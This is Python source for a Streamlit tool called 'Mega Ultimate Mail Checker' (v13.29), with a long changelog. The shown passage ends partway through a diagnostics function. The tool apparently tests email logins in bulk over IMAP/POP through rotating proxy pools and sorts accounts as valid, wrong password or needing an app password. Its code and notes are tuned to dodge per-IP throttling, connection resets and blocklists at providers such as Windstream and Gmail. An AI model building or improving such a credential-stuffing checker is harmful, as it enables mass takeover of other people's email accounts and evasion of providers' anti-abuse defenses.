"""
Mega Ultimate Mail Checker — v13.29
===================================
Complete rewrite. SMTP reachability is an OPT-IN pre-check stage (never inside
the validator), status classification actually works, and every direct-connection
line carries the real egress IP / region / country / VPN state.

v13.29 changes  (a socket reset is not a 407, and 9 IPs are not 85 nodes)
------------------------------------------------------------------------
A live run proved the pool REACHES Windstream (real "LOGIN failed" answers came
back through nodes) while ~half of the attempts died with a bare socket error
that was being mislabelled 407 and quarantined.

  * NEW ProxyTransportError.  A broken tunnel is now its own exception, handled
    BEFORE the generic handler, so "proxy connection failed" can never be read
    as proxy-level and quarantined.  Only a genuine rejection on the PREFERRED
    scheme raises ProxyAuthError.
  * A SOCKET ERROR NOW ROTATES THE NODE.  rotate_now used to be
    _is_proxy_level_error("Socket error: ...") == False, so a flaky node burned
    the rung instead of being swapped.
  * NEW PER-PROXY-IP GATE (PROXY_IP_CONCURRENCY, default 2).  The pool is 85
    LINES but only 9 distinct IPs (7 sub-users x 9 IPs).  HOST_CONCURRENCY caps
    connections per HOSTNAME, so three workers could pile onto one mail host
    from the SAME source IP - and Windstream resets the third.  Evidence: a node
    answered a real LOGIN, then 407'd one second later on the same node.
  * THE LOCAL-PART RETRY NO LONGER REUSES THE NODE.  It grabs a fresh one,
    because the second back-to-back connect from the same IP is what fails.
  * THE TRACE NO LONGER TRUNCATES THE ERROR at 70 chars, so the errno is visible.
  * HOST_CONCURRENCY 3 -> 2, PROXY_CONCURRENCY 12 -> 8.
  * THE DASHBOARD SHOWS THE USERNAME AND THE DISTINCT-IP COUNT.

v13.28 changes  (a 407 is no longer invented by a dead SOCKS5 listener)
-----------------------------------------------------------------------
A provider that ACCEPTS your credentials over HTTP CONNECT but REJECTS them over
SOCKS5 (255) was turning every ordinary transport failure into a fake 407.

  * THE HTTP SCHEME IS NOW THE DEFAULT.  _scheme_order() led with SOCKS5, so
    every fresh node paid a wasted SOCKS5 round trip - and, worse, a SOCKS5
    "authentication failed" poisoned proxy_connect()'s proxy_auth_err even when
    the HTTP attempt that followed had merely TIMED OUT.  proxy_connect() now
    raises ProxyAuthError ONLY when the scheme it PREFERS auth-failed.
  * tunnel_probe() APPLIES THE SAME RULE.
  * THE POOL PROBE CAN NOW TARGET THE ACTUAL MAIL HOST ("windstream 993").
  * _remember_scheme() no longer locks onto a scheme that 255s.

v13.27 changes
--------------
* PROXY RANDOM ROTATION IS NOW REAL ROTATION, with an account-level avoid set.
* A CONNECT-LEVEL TIMEOUT NO LONGER RETRIES IN PLACE.  It rotates once and
  advances; only READ-level slowness retries.
* THE POP RUNG IS NO LONGER LAST.  It is interleaved at rung 2.
* WEB-ONLY HOSTS DROPPED FROM THE LADDER.
* CONNECT / READ FLOORS RAISED 8 -> 10 / 8 -> 15.
* STORM BREAKER WIDENED.  MAX_ROTATIONS 3 -> 5, PROXY_407_FORCE_DIRECT 2 -> 5.

v13.26 changes
--------------
* DEADLINE DEFAULTS RAISED.  Normal 45 -> 90, Fast 25 -> 45, Deep 60 -> 120.
* THE POP RUNG NO LONGER DIALS AN IMAP HOSTNAME.
* WORKER FUTURE TIMEOUT made generous enough for a floored budget.

v13.25 changes  (the run was being throttled to death, not blocked)
-------------------------------------------------------------------
* FIX - HOST ORDER WAS IGNORING FAMILY PRIORITY (app.py shadowed hosts.py).
* FIX - A 407 WAS A PROXY-PROVIDER CONCURRENCY REFUSAL.  NEW GLOBAL PROXY GATE.
* FIX - A TIMEOUT WAS THE MAIL SERVER REFUSING CONNECTIONS.  NEW PER-HOST GATE
  plus a bounded IN-PLACE RETRY with backoff.
* FIX - SOCKET FLOORS RAISED to 8s.
* FIX - DIRECT-FIRST when the pool is mostly quarantined.
* FIX - THE BARE APEX RUNG IS DEMOTED.
* Default worker count lowered (Normal 30 -> 15).

v13.24 / v13.23 / v13.22 / v13.21 / v13.20 / v13.19 / v13.18 — see git history.

NO hardcoded proxy IPs and NO faked geo table. Everything is derived from
proxies.txt / Streamlit secrets / live DNS / live ip-api.
"""

import streamlit as str_lit
import streamlit as st
import imaplib
import poplib
import ssl
import json
import os
import re
import html
import random
import platform
import threading
import socket
import sys
import time
import warnings
import glob
import zipfile
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from collections import defaultdict
import pandas as pd
import concurrent.futures
from dataclasses import dataclass, field
from typing import List, Dict, Optional

# ============================================================================
# RESILIENT IMPORTS
# ============================================================================
HOSTS_OK = True
HOSTS_HAS_RANKING = True
HOSTS_IMPORT_NOTE = ""

try:
    from hosts import (conf as host_conf, STRICT_APP, ZERO_ACCESS, PARENT,
                       MS_DOMAINS, GMAIL_DOMAINS, smtp_candidates as host_smtp_candidates)
except Exception as _hosts_core_err:
    HOSTS_OK = False
    HOSTS_IMPORT_NOTE = f"hosts.py core import failed ({_hosts_core_err}); using built-in tables."
    STRICT_APP = {"gmail.com", "googlemail.com", "outlook.com", "hotmail.com", "live.com", "windowslive.com"}
    ZERO_ACCESS = {"proton.me", "protonmail.com", "pm.me", "tuta.io", "tutanota.com", "tutamail.com", "tuta.com"}
    PARENT = {"memoad.jp": "biglobe.ne.jp"}
    MS_DOMAINS = {"outlook.com", "hotmail.com", "live.com", "msn.com", "hotmail.co.uk"}
    GMAIL_DOMAINS = {"gmail.com", "googlemail.com"}

    def host_smtp_candidates(domain):
        return []

    _BB_STATIC_CONF = {
        "gmail.com": (["imap.gmail.com"], ["pop.gmail.com"]),
        "googlemail.com": (["imap.gmail.com"], ["pop.gmail.com"]),
        "outlook.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "hotmail.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "live.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "msn.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "yahoo.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "ymail.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "btinternet.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "bt.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "btopenworld.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "talk21.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "sky.com": (["imap.tools.sky.com"], ["imap.tools.sky.com"]),
        "virginmedia.com": (["imap.virginmedia.com"], ["imap.virginmedia.com"]),
        "ntlworld.com": (["imap.virginmedia.com"], ["imap.virginmedia.com"]),
        "blueyonder.co.uk": (["imap.virginmedia.com"], ["imap.virginmedia.com"]),
        "aol.com": (["imap.aol.com"], ["pop.aol.com"]),
        "icloud.com": (["imap.mail.me.com"], ["pop.mail.me.com"]),
        "me.com": (["imap.mail.me.com"], ["pop.mail.me.com"]),
        "zoho.com": (["imap.zoho.com"], ["pop.zoho.com"]),
        "gmx.net": (["imap.gmx.net"], ["pop.gmx.net"]),
        "gmx.de": (["imap.gmx.net"], ["pop.gmx.net"]),
        "web.de": (["imap.web.de"], ["pop3.web.de"]),
        "t-online.de": (["secureimap.t-online.de"], ["securepop.t-online.de"]),
        "freenet.de": (["imap.freenet.de"], ["pop.freenet.de"]),
        "free.fr": (["imap.free.fr"], ["pop.free.fr"]),
        "orange.fr": (["imap.orange.fr"], ["pop.orange.fr"]),
        "qq.com": (["imap.qq.com"], ["pop.qq.com"]),
        "naver.com": (["imap.naver.com"], ["pop.naver.com"]),
    }

    def host_conf(domain):
        domain = (domain or "").lower().strip()
        if domain in ZERO_ACCESS:
            return {"imap": [], "pop": [], "pop3": [], "type": "zero_access"}
        got = _BB_STATIC_CONF.get(domain)
        if got:
            return {"imap": list(got[0]), "pop": list(got[1]), "pop3": list(got[1])}
        return None

try:
    from hosts import rank_hosts as host_rank_hosts, is_junk_host as host_is_junk
except Exception as _hosts_rank_err:
    HOSTS_HAS_RANKING = False
    _note = f"hosts.py has no rank_hosts/is_junk_host ({_hosts_rank_err}); using built-in ranking."
    HOSTS_IMPORT_NOTE = (HOSTS_IMPORT_NOTE + " " + _note).strip() if HOSTS_IMPORT_NOTE else _note

    _BB_ROUTER_LABEL_EXACT = re.compile(
        r"^(?:"
        r"mx|mx\d+|mta|mtas|mta\d+|smtp|smtps|smtpout|smtp-in|smtp-out|"
        r"inbound|outbound|relay|relay\d+|spool|filter|filters|cluster|clust\d+|"
        r"edge|edge\d+|gateway|gw|gw\d+|router|mailrouter|aspmx|aspmx\d*|"
        r"alt\d+|protection|hs|lb|"
        r"mx-aol|mx-aol\.mail|mx\.google|eur\.olc|olc\.protection"
        r")$"
    )
    _BB_ROUTER_TOKENS = (
        "mta", "smtp", "relay", "inbound", "outbound", "spool",
        "filter", "cluster", "mailrouter", "olc.protection",
        "protection.outlook", "aspmx", "gateway",
    )
    _BB_SERVICE_PREFIXES = (
        "imap", "imaps", "imap2", "mail", "mail2", "pop", "pop3", "pop3s",
        "webmail", "webmail2", "email", "correo", "zimbra", "zcs",
        "secure", "ssl", "outlook", "exchange", "owa",
    )
    _BB_SKIP_LABELS = {"mail", "email", "webmail", "imap", "imaps", "pop", "pop3", "smtp", "correo"}

    def host_is_junk(host, domain=None):
        h = (host or "").lower().strip().strip(".")
        if not h:
            return True
        if domain and h == (domain or "").lower().strip():
            return True
        labels = h.split(".")
        if len(labels) < 2:
            return False
        for lab in labels[:-1]:
            if _BB_ROUTER_LABEL_EXACT.match(lab):
                return True
        for lab in labels[:-1]:
            if lab in _BB_SKIP_LABELS:
                continue
            if any(tok in lab for tok in _BB_ROUTER_TOKENS):
                return True
            if re.search(r"(?:^|[-_])mx\d*(?:$|[-_])", lab):
                return True
        return False

    def _bb_tier(host, domain):
        h = (host or "").lower().strip().strip(".")
        d = (domain or "").lower().strip().strip(".")
        if not h:
            return 4
        if d and h == d:
            return 3
        if d and h.endswith("." + d):
            if host_is_junk(h, d):
                return 3
            if h[: -(len(d) + 1)].split(".")[0] in _BB_SERVICE_PREFIXES:
                return 0
            return 1
        if host_is_junk(h, d):
            return 3
        return 2

    def _bb_resolves(host):
        try:
            socket.getaddrinfo(host, None)
            return True
        except Exception:
            return False

    _bb_probe_lock = threading.Lock()
    _bb_probe_cache = {}
    _BB_PROBE_TTL = 600

    def _bb_port_open(host, port, timeout=1.5):
        try:
            _s = socket.create_connection((host, port), timeout=timeout)
            _s.close()
            return True
        except Exception:
            return False

    def _bb_probe(host):
        if not host:
            return False
        now = time.time()
        with _bb_probe_lock:
            hit = _bb_probe_cache.get(host)
            if hit and now - hit[0] < _BB_PROBE_TTL:
                return hit[1]
        ok = _bb_port_open(host, 993) or _bb_port_open(host, 143)
        with _bb_probe_lock:
            _bb_probe_cache[host] = (now, ok)
        return ok

    def host_rank_hosts(hosts, domain, probe=True):
        hosts = [h for h in (hosts or []) if h]
        if not hosts:
            return []
        indexed = list(enumerate(hosts))
        if not probe:
            indexed.sort(key=lambda t: (0 if _bb_resolves(t[1]) else 1, _bb_tier(t[1], domain), t[0]))
            return [h for _i, h in indexed]
        tiers = {h: _bb_tier(h, domain) for h in set(hosts)}
        resolves = {h: _bb_resolves(h) for h in set(hosts)}
        to_probe = [h for h in dict.fromkeys(hosts) if tiers[h] <= 1 and resolves[h]][:6]
        live = {}
        if to_probe:
            try:
                with concurrent.futures.ThreadPoolExecutor(max_workers=min(6, len(to_probe))) as ex:
                    futs = {ex.submit(_bb_probe, h): h for h in to_probe}
                    for fut in concurrent.futures.as_completed(futs, timeout=6):
                        h = futs[fut]
                        try:
                            live[h] = fut.result()
                        except Exception:
                            live[h] = False
            except Exception:
                pass
        indexed.sort(key=lambda t: (
            0 if resolves.get(t[1], False) else 1,
            tiers.get(t[1], 4),
            0 if live.get(t[1], False) else 1,
            t[0],
        ))
        return [h for _i, h in indexed]

# --- v13.25 : delegate host merging to hosts.py so FAMILY_PRIORITY applies ---
try:
    from hosts import (merge_domain_guesses as _hosts_merge_guesses,
                       _family_priority as _hosts_family_priority)
    _HAVE_HOSTS_MERGE = True
except Exception:
    _HAVE_HOSTS_MERGE = False

# --- status.py : both naming conventions are exported -----------------------
try:
    from status import (
        VALID, WRONG, WRONG_PASSWORD, APP, NEED_APP_PASSWORD,
        FAILED, CONNECTION_FAILED, PROXY_UNHEALTHY,
        SKIP, SKIPPED_COOLDOWN, UNKNOWN,
        RETRY, RETRY_LATER, RBL, RBL_BLOCKED, SMTP_FAILED, DNS_FAILED,
        ALL_STATUSES as ST_ALL, LABELS as ST_LABELS, COLORS as ST_COLORS,
        PRIORITY as ST_PRIORITY,
        classify_error as st_classify, is_proxy_level_error as st_proxy_level,
        display as st_display, color as st_color,
    )
    STATUS_OK = True
    STATUS_IMPORT_NOTE = "status.py loaded (real classifier active)."
except Exception as _status_err:
    STATUS_OK = False
    STATUS_IMPORT_NOTE = f"status.py import failed ({_status_err}); using inline fallback."
    warnings.warn(STATUS_IMPORT_NOTE)
    VALID = "valid"
    WRONG = WRONG_PASSWORD = "wrong_password"
    APP = NEED_APP_PASSWORD = "need_app_password"
    FAILED = CONNECTION_FAILED = "connection_failed"
    PROXY_UNHEALTHY = "proxy_unhealthy"
    SKIP = SKIPPED_COOLDOWN = "skipped_cooldown"
    UNKNOWN = "unknown"
    RETRY = RETRY_LATER = "retry_later"
    RBL = RBL_BLOCKED = "rbl_blocked"
    SMTP_FAILED = "smtp_failed"
    DNS_FAILED = "dns_failed"
    ST_ALL = [VALID, WRONG_PASSWORD, NEED_APP_PASSWORD, RETRY_LATER, RBL_BLOCKED,
              SMTP_FAILED, DNS_FAILED, CONNECTION_FAILED, PROXY_UNHEALTHY,
              UNKNOWN, SKIPPED_COOLDOWN]
    ST_LABELS = {s: s.upper() for s in ST_ALL}
    ST_COLORS = {
        VALID: "#22c55e", WRONG_PASSWORD: "#ef4444", CONNECTION_FAILED: "#eab308",
        PROXY_UNHEALTHY: "#e879f9",
        NEED_APP_PASSWORD: "#3b82f6", RETRY_LATER: "#ffffff", RBL_BLOCKED: "#facc15",
        SMTP_FAILED: "#a855f7", DNS_FAILED: "#f97316", UNKNOWN: "#94a3b8",
        SKIPPED_COOLDOWN: "#a78bfa",
    }
    ST_PRIORITY = {
        VALID: 0, NEED_APP_PASSWORD: 1, WRONG_PASSWORD: 2, RBL_BLOCKED: 3,
        RETRY_LATER: 4, SMTP_FAILED: 5, DNS_FAILED: 6, CONNECTION_FAILED: 7,
        PROXY_UNHEALTHY: 8, UNKNOWN: 9, SKIPPED_COOLDOWN: 10,
    }

    _FB_APP = ("app password", "application-specific", "basic authentication is disabled",
               "web browser", "via your web browser", "2fa", "mfa", "two-factor",
               "enable imap", "login-disabled")
    _FB_RBL = ("rbl restriction", "rbl", "abusix", "dnsbl", "spamhaus",
               "blacklist", "blacklisted", "ip blocked")
    _FB_DNS = ("does not resolve", "name or service not known", "gaierror", "getaddrinfo")
    _FB_RETRY = ("lookup failed", "could not be routed", "temporarily", "too many",
                 "blacklisted", "rate limit", "throttl", "try again", "unavailable")
    _FB_CONN = ("timed out", "timeout", "connection refused", "connection reset", "socket error",
                "eof", "tls not supported", "stls not supported", "ssl", "no route to host",
                "wrong version number", "proxy and direct fallback", "handshake", "407")
    _FB_WRONG_STRONG = ("realmless login not allowed", "authenticationfailed",
                        "authentication failed", "invalid credentials", "login incorrect",
                        "wrong password", "authenticate error")
    _FB_WRONG = ("authenticate failed", "authentication error", "auth failed", "auth failure",
                 "invalid login", "invalid password", "invalid user", "invalid username",
                 "login failed", "login failure", "login error", "password incorrect",
                 "password invalid", "incorrect password", "realmless", "auth error",
                 "[auth]", "authentication", "not authenticated", "bad credentials",
                 "bad username", "bad password", "logon failure",
                 "username and password not accepted", "user rejected", "password rejected",
                 "invalid token", "expired token", "internal server error")
    _FB_BARE = ("login", "logon", "auth", "authenticate", "authentication",
                "sign in", "signin", "sign-in", "credentials", "invalid")

    def st_classify(raw, domain=""):
        t = (raw or "").lower()
        if t.strip().rstrip(".:!,;").strip() in _FB_BARE:
            return WRONG_PASSWORD
        for table, val in ((_FB_APP, NEED_APP_PASSWORD), (_FB_RBL, RBL_BLOCKED),
                           (_FB_WRONG_STRONG, WRONG_PASSWORD),
                           (_FB_DNS, DNS_FAILED), (_FB_RETRY, RETRY_LATER),
                           (_FB_CONN, CONNECTION_FAILED), (_FB_WRONG, WRONG_PASSWORD)):
            if any(n in t for n in table):
                return val
        return UNKNOWN

    def st_proxy_level(raw):
        s = (raw or "").lower()
        return any(k in s for k in ("407", "proxy auth", "proxy connect", "socks"))

    def st_display(s):
        return ST_LABELS.get(s, s)

    def st_color(s):
        return ST_COLORS.get(s, "#cbd5e1")

try:
    from status import ALL as ST_ALL
except Exception:
    pass

# --- ms_oauth.py : Microsoft XOAUTH2 (personal accounts) --------------------
try:
    import ms_oauth
    MS_OAUTH_OK = True
except Exception as _ms_err:
    ms_oauth = None
    MS_OAUTH_OK = False

if not MS_OAUTH_OK:
    warnings.warn("ms_oauth.py unavailable; Microsoft accounts will report "
                  "NEED_APP_PASSWORD and never validate without an app password.")

# Optional network libs
try:
    import dns.resolver
except ImportError:
    dns = None

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

try:
    import socks
    SOCKS_OK = True
except ImportError:
    SOCKS_OK = False

if not SOCKS_OK:
    warnings.warn("PySocks is not installed! SOCKS proxy support disabled. Run 'pip install PySocks'.")

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# --- Page Config (MUST be the first Streamlit call) ---
str_lit.set_page_config(
    page_title="Mega Ultimate Mail Checker",
    page_icon="⚡",
    layout="wide",
    initial_sidebar_state="expanded"
)

# ============================================================================
# PROXY-LAYER FAILURE CONTRACT  (v13.25 / v13.27 / v13.28 / v13.29)
# ============================================================================
PROXY_407_QUARANTINE = 2          # genuine 407s on a node before it leaves the pool
PROXY_407_FORCE_DIRECT = 5        # v13.27: was 2 - with 85 nodes, 4 proves nothing

DEDUPE_PROXIES_DEFAULT = True     # collapse duplicate host:port lines in proxies.txt
PROBE_TIMEOUT_DEFAULT = 8.0       # seconds for the CONNECT tunnel probe (was hardcoded 3.0)
PROBE_TARGET_DEFAULT = "993 (IMAP)"
PROBE_STRICT_DEFAULT = True       # True: only probe-passing nodes enter the pool
PROBE_TARGET_PORTS = {
    "993 (IMAP)": [("imap.gmail.com", 993, "993")],
    "443 (HTTPS)": [("api.ipify.org", 443, "443")],
    # v13.28: gmail says nothing about whether a node can reach the MAIL host.
    "windstream 993": [("imap.windstream.net", 993, "ws-imap993")],
    "windstream 995": [("pop.windstream.net", 995, "ws-pop995")],
    "both (either)": [("imap.gmail.com", 993, "993"), ("api.ipify.org", 443, "443")],
}

# v13.25 concurrency + scheduling defaults
PROXY_CONCURRENCY_DEFAULT = 8     # v13.29: was 12 - simultaneous proxy tunnels
HOST_CONCURRENCY_DEFAULT = 2      # v13.29: was 3  - simultaneous connections to ONE mail host
# v13.29: the pool is 85 LINES but only 9 distinct IPs.  HOST_CONCURRENCY caps
# per HOSTNAME, so N workers could all ride the SAME source IP.  This caps
# simultaneous tunnels per PROXY IP, which is what the mail server actually sees.
PROXY_IP_CONCURRENCY_DEFAULT = 2
CONNECT_FLOOR_DEFAULT = 10.0      # minimum TCP connect timeout
READ_FLOOR_DEFAULT = 15.0         # minimum socket read timeout
SAME_HOST_RETRIES_DEFAULT = 1     # in-place retries when a host answers SLOWLY
DIRECT_FIRST_DEFAULT = False

# v13.27: hosts that answer DNS but never speak IMAP.
WEB_ONLY_HOSTS = {
    "secure.windstream.net",
    "webmail.windstream.net",
    "secure.suddenlink.net",
    "webmail.suddenlink.net",
    "secure.optimum.net",
}

class ProxyAuthError(ConnectionError):
    """The PROXY rejected our CREDENTIALS (407). The mail host is still untested."""

class ProxyTransportError(ConnectionError):
    """v13.29: the tunnel broke at the SOCKET level. Not a 407, not a mail verdict.

    Kept separate so the generic handler can never read it as proxy-level and
    quarantine a node that is merely flaky, and so a socket reset rotates the
    node instead of burning the rung.
    """

def _is_proxy_auth_fail(msg) -> bool:
    """True when the PROXY ITSELF rejected us, as opposed to a transport failure."""
    m = (msg or "").lower()
    return ("407" in m
            or "proxy authentication required" in m
            or "socks5 authentication failed" in m
            or "socks authentication failed" in m)

def _timeout_kind(err) -> str:
    """v13.27: 'connect' | 'read' | ''.

    'timed out'                     -> the SYN or the TLS handshake never finished.
    'The read operation timed out'  -> the socket CONNECTED and the server is slow.
    """
    low = str(err).lower()
    if "read operation timed out" in low:
        return "read"
    if "timed out" in low or "timeout" in low:
        return "connect"
    return ""

# ============================================================================
# PERSISTENT ENGINE STATE  (v13.21 — survives every Streamlit rerun)
# ============================================================================

@str_lit.cache_resource(show_spinner=False)
def _engine_state():
    _meta = {}
    try:
        if os.path.exists("proxy_meta.json"):
            with open("proxy_meta.json", encoding="utf-8") as _f:
                _meta = json.load(_f) or {}
    except Exception:
        _meta = {}
    return {
        # locks
        "cache_lock": threading.Lock(),
        "proxy_lock": threading.Lock(),
        "file_write_lock": threading.Lock(),
        "session_state_lock": threading.Lock(),
        "alive_pool_lock": threading.Lock(),
        "host_dns_lock": threading.Lock(),
        "proxy_quarantine_lock": threading.Lock(),
        "proxy_scheme_lock": threading.Lock(),
        "probe_stats_lock": threading.Lock(),
        "probe_log_lock": threading.Lock(),
        "tunnel_lock": threading.Lock(),
        "rr_lock": threading.Lock(),
        "geo_lock": threading.Lock(),
        "public_ip_lock": threading.Lock(),
        "direct_geo_lock": threading.Lock(),
        "smtp_lock": threading.Lock(),
        "target_reach_lock": threading.Lock(),
        # concurrency gates (persistent so a rerun cannot orphan them)
        "host_gate_lock": threading.Lock(),
        "host_gates": {},
        "ip_gates": {},            # v13.29
        "proxy_gate": None,
        # engine / proxy state
        "bad_proxies": set(),
        "alive_pool": [],
        "consecutive_proxy_failures": defaultdict(int),
        "circuit_breaker_until": {},
        "failed_domain_cache": {},
        "host_dns_cache": {},
        "proxy_quarantine": set(),
        "strikes_407": defaultdict(int),
        "proxy_scheme": {},
        "probe_stats": {},
        "probe_log": [],
        "meta": _meta,
        "tunnel_cache": {},
        "rr_index": 0,
        "rr_last": None,
        # caches that must not be rebuilt on every click
        "geo_cache": {},
        "public_ip": {"ip": "", "ts": 0.0},
        "direct_geo": {"ts": 0.0, "ip": "", "country": "Unknown", "region": "Unknown", "vpn": "Auto"},
        "direct_isp": {"ts": 0.0, "isp": ""},
        "smtp_domain_cache": {},
        "target_reach": {"ts": 0.0, "rows": []},
        "selftest": {"ts": 0.0, "text": ""},
        # probe bookkeeping
        "probe_in_flight": False,
        "last_probe_ts": 0.0,
        "probe_runs": 0,
        "process_start": time.time(),
    }

STATE = _engine_state()

# --- aliases: these names point at the PERSISTENT objects, never rebound ----
probe_stats = STATE["probe_stats"]
probe_stats_lock = STATE["probe_stats_lock"]
probe_log = STATE["probe_log"]
probe_log_lock = STATE["probe_log_lock"]

_PROBE_REASON_LABEL = {
    "ok": "pass",
    "auth": "407 auth",
    "transport": "transport reset",
    "timeout": "timeout",
    "dead": "dead",
    "tcp": "tcp dead",
    "format": "bad format",
    "nosocks": "no PySocks",
    "blocked": "circuit-broken",
}

def log_probe_event(msg):
    with probe_log_lock:
        probe_log.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        if len(probe_log) > 300:
            del probe_log[:-300]

def record_probe_result(proxy_str, ok, reason, latency_ms=0, target="", scheme=None, error=""):
    if not proxy_str:
        return
    with probe_stats_lock:
        prev = probe_stats.get(proxy_str) or {}
        probe_stats[proxy_str] = {
            "ok": bool(ok),
            "reason": reason or ("ok" if ok else "dead"),
            "ts": time.time(),
            "latency_ms": int(latency_ms or 0),
            "target": target or "",
            "scheme": scheme,
            "error": (error or "")[:300],
            "attempts": int(prev.get("attempts", 0)) + 1,
            "first_seen": prev.get("first_seen") or time.time(),
        }
    STATE["last_probe_ts"] = time.time()

def probe_summary():
    """(passed, auth, timeout, dead) over the most recent probe of each node."""
    with probe_stats_lock:
        snap = list(probe_stats.values())
    passed = sum(1 for v in snap if v.get("ok"))
    auth = sum(1 for v in snap if not v.get("ok") and v.get("reason") == "auth")
    timeout = sum(1 for v in snap if not v.get("ok") and v.get("reason") in ("timeout", "transport"))
    dead = sum(1 for v in snap if not v.get("ok") and v.get("reason") not in ("auth", "timeout", "transport"))
    return passed, auth, timeout, dead

def probe_reason_histogram():
    with probe_stats_lock:
        snap = list(probe_stats.values())
    hist = defaultdict(int)
    for v in snap:
        hist[v.get("reason") or "?"] += 1
    return dict(sorted(hist.items(), key=lambda kv: -kv[1]))

def clear_tunnel_cache():
    with _tunnel_lock:
        _tunnel_cache.clear()
    with probe_stats_lock:
        probe_stats.clear()

def probe_timeout() -> float:
    try:
        return float(CFG.get("PROBE_TIMEOUT", PROBE_TIMEOUT_DEFAULT))
    except Exception:
        return PROBE_TIMEOUT_DEFAULT

def probe_targets():
    try:
        name = CFG.get("PROBE_TARGET", PROBE_TARGET_DEFAULT)
    except Exception:
        name = PROBE_TARGET_DEFAULT
    return PROBE_TARGET_PORTS.get(name) or PROBE_TARGET_PORTS[PROBE_TARGET_DEFAULT]

# ============================================================================
# DIAGNOSTIC HELPERS
# ============================================================================

def _env_info():
    info = {}
    info["python"] = sys.version.replace("\n", " ").strip()
    info["platform"] = platform.platform()
    info["machine"] = platform.machine()
    info["cwd"] = os.getcwd()
    try:
        info["streamlit"] = getattr(str_lit, "__version__", "unknown")
    except Exception:
        info["streamlit"] = "unknown"
    try:
        info["pandas"] = pd.__version__
    except Exception:
        info["pandas"] = "unknown"
    try:
        import socks as _s
        info["pysocks"] = getattr(_s, "__version__", "present(no __version__)")
    except Exception:
        info["pysocks"] = "MISSING"
    try:
        import requests as _r
        info["requests"] = getattr(_r, "__version__", "present")
    except Exception:
        info["requests"] = "MISSING"
    try:
        import dns as _d
        info["dnspython"] = getattr(_d, "version", None) and str(_d.version.version) or "present"
    except Exception:
        info["dnspython"] = "MISSING"
    info["socks_ok_flag"] = SOCKS_OK
    info["hosts_ok"] = HOSTS_OK
    info["hosts_merge"] = _HAVE_HOSTS_MERGE
    info["status_ok"] = STATUS_OK
    info["ms_oauth_ok"] = MS_OAUTH_OK
    for f in ("proxies.txt", "proxy_meta.json", "theme.json", "domain_cache.json"):
        try:
            if os.path.exists(f):
                stt = os.stat(f)
                info[f] = f"{stt.st_size} bytes, mtime {datetime.fromtimestamp(stt.st_mtime).strftime('%Y-%m-%d %H:%M:%S')}"
            else:
                info[f] = "ABSENT"
        except Exception as e:
            info[f] = f"stat error: {e}"
    return info

def _probe_target_reachability(force=False):
    now = time.time()
    with STATE["target_reach_lock"]:
        cached = STATE.get("target_reach") or {}
        if not force and cached.get("rows") and (now - cached.get("ts", 0)) < 60:
            return cached["rows"]
    rows = []
    for host, port, label in PROBE_TARGET_PORTS["both (either)"]:
        row = {"target": f"{host}:{port}", "label": label}
        t0 = time.time()
        try:
            s = socket.create_connection((host, int(port)), timeout=6.0)
            s.close()
            row["ok"] = True
            row["ms"] = int((time.time() - t0) * 1000)
            row["err"] = ""
        except Exception as e:
            row["ok"] = False
            row["ms"] = int((time.time() - t0) * 1000)
            row["err"] = f"{type(e).__name__}: {str(e)[:120]}"
        try:
            ip = socket.gethostbyname(host)
            row["resolved"] = ip
        except Exception as e:
            row["resolved"] = f"DNS FAIL {type(e).__name__}"
        rows.append(row)
    with STATE["target_reach_lock"]:
        STATE["target_reach"] = {"ts": now, "rows": rows}
    return rows

def _detect_line_format(line):
    p = (line or "").strip()
    if not p:
        return "empty"
    if "://" in p:
        return "scheme:// (url form)"
    if "@" in p:
        return "user:pass@host:port"
    parts = p.split(":")
    if len(parts) == 4:
        return "host:port:user:pass"
    if len(parts) == 2:
        return "host:port (NO CREDS)"
    return f"UNRECOGNISED ({len(parts)} colon-parts)"

def _analyze_proxy_file():
    out = {"exists": False, "total": 0, "unique": 0, "with_creds": 0,
           "unparsable": 0, "formats": {}, "dupe_map": {}, "sample": [],
           "distinct_ips": 0, "distinct_users": 0}
    try:
        if not os.path.exists("proxies.txt"):
            return out
        out["exists"] = True
        with open("proxies.txt", encoding="utf-8", errors="ignore") as f:
            raw = [l.rstrip("\n") for l in f]
        lines = [l.strip() for l in raw if l.strip() and not l.startswith("#")]
        out["total"] = len(lines)
        out["unique"] = len(list(dict.fromkeys(lines)))
        out["sample"] = lines[:10]
        ips, users = set(), set()
        for l in lines:
            fmt = _detect_line_format(l)
            out["formats"][fmt] = out["formats"].get(fmt, 0) + 1
            if "@" in l:
                out["with_creds"] += 1
            info = parse_proxy(l)
            if not info:
                out["unparsable"] += 1
                continue
            ips.add(info["host"])
            if info.get("user"):
                users.add(info["user"])
            hp = f"{info['host']}:{info['port']}"
            out["dupe_map"][hp] = out["dupe_map"].get(hp, 0) + 1
        out["distinct_ips"] = len(ips)
        out["distinct_users"] = len(users)
    except Exception as e:
        out["error"] = str(e)
    return out

def _thread_report():
    return [f"{t.name} | daemon={t.daemon} | alive={t.is_alive()}" for t in threading.enumerate()]

def build_diagnostics_text():
    L = []
    def A(s=""):
        L.append(str(s))

    A("=" * 78)
    A("MEGA ULTIMATE MAIL CHECKER — v13.29 DIAGNOSTIC BUNDLE")
    A(f"generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    A("=" * 78)

    A("")
    A("--- 1. ENVIRONMENT ---")
    for k, v in _env_info().items():
        A(f"  {k:16}: {v}")

    A("")
    A("--- 2. ACTIVE CONFIG (CFG) ---")
    try:
        for k in sorted(CFG.keys()):
            A(f"  {k:28}: {CFG.get(k)}")
    except Exception as e:
        A(f"  CFG unavailable: {e}")

    A("")
    A("--- 3. PROXY FILE AUDIT (proxies.txt) ---")
    fa = _analyze_proxy_file()
